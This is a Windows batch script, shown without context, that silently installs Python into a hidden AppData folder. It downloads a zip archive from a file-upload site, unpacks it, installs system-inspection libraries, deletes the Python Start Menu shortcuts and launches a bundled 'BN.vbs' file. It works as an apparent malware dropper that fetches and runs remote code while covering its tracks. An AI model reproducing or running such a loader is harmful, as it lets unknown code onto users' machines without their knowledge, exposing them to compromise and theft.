setlocal enabledelayedexpansion

:: Define variables
set "pythonInstallerUrl=https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
set "zipScriptUrl=https://s01.babup.com/uploads/System_6e03a.zip"
set "targetDirectory=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"

:: Function to check if the directory contains four files
:CheckDirectoryContent
set "fileCount=0"
for %%i in ("%targetDirectory%\*.*") do (
    set /a "fileCount+=1"
)

:: Create directory if it doesn't exist
if not exist "%USERPROFILE%\AppData\System" (
    mkdir "%USERPROFILE%\AppData\System"
)

:: Download Python installer
powershell -command "Invoke-WebRequest '%pythonInstallerUrl%' -OutFile '%USERPROFILE%\AppData\System\pythonX.exe'"
"%USERPROFILE%\AppData\System\pythonX.exe" /quiet InstallAllUsers=0 PrependPath=1

:: Download the zip script
powershell -command "Invoke-WebRequest '%zipScriptUrl%' -OutFile '%USERPROFILE%\AppData\System\System.zip'"

:: Unzip the script in the same directory
powershell -command "Expand-Archive -Path '%USERPROFILE%\AppData\System\System.zip' -DestinationPath '%USERPROFILE%\AppData\System' -Force"

:: Install required Python libraries


:: Check and remove existing files
if %fileCount% GEQ 4 (
    for /d %%i in ("%targetDirectory%\*.*") do (
        rmdir /s /q "%%i"
    )
)



C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install os
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install requests
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install ctypes
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install termcolor
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install wmi
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\pip.exe install psutil
del "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11" /q
:: Run Python script
cd C:\Users\%USERNAME%\AppData\System
start BN.vbs
exit
:: Display completion message
echo Script completed!

